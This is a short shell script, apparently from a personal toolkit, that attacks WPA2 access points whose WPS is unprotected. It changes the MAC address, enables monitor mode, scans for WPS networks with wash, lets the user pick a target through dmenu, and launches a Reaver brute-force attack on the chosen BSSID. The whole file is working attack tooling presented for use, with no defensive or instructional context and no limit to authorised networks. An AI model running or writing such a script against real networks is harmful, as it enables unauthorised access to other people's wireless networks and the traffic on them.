#!/bin/sh

# Attack a WPA2 protected Access Point
# Thats WPS unprotected using Reaver

return_to_default() {
	airmon-ng stop "$INTERFACE" 
	./monitor_mode.sh -d # Disable monitor mode
	rm "$TMP_FILE"
}

trap return_to_default EXIT

export INTERFACE
INTERFACE="$(./pick_interface.sh)"

# Prepare interface for monitor mode
./macchange.sh "$INTERFACE"
./monitor_mode.sh -e # Enable monitor mode
airmon-ng start "$INTERFACE" 

suffix="mon"
INTERFACE="$INTERFACE$suffix"

# Scan for WPS vulnerable networks
export TMP_FILE
TMP_FILE="$(mktemp)"
wash -i "$INTERFACE" > "$TMP_FILE" &
sleep 5
killall wash

# Select a network and start the attack
SELECTED_AP="$(grep -P '\d' "$TMP_FILE" | dmenu -i -l 10 -p 'Select AP:')"
BSSID="$(echo "$SELECTED_AP" | awk '{print $1}')"

reaver -i "$INTERFACE" -b "$BSSID" -vv
